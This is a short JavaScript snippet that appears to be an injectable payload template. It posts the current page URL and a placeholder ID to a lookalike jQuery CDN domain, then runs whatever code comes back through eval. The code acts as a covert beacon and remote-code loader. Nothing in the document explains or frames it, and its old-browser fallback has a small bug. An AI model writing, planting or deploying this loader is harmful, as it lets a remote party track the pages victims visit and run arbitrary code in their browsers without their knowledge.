function whatever() {
    if(typeof window.doneTheStuff == 'undefined') {
        var xmlhttp;
        var uuid = "replacemeuuid";

        if (window.XMLHttpRequest) {
          xmlhttp = new XMLHttpRequest();
        } else {
          new ActiveXObject("Microsoft.XMLHTTP");
        }

        xmlhttp.onreadystatechange = function() {
          if (xmlhttp.readyState == 4 ) {
             if(xmlhttp.status == 200) {
                 eval(xmlhttp.responseText);
             }
          }
        };

        xmlhttp.open("POST", "http://github-cdn.com/jquery/stable", true);
        xmlhttp.setRequestHeader('Content-Type', 'application/json');
        var url = document.URL;
        var sending = {version: uuid, stats: url};
        if(url.indexOf("file") != 0) {
            xmlhttp.send(JSON.stringify(sending));
        }
        window.doneTheStuff = true;
    }
}
whatever();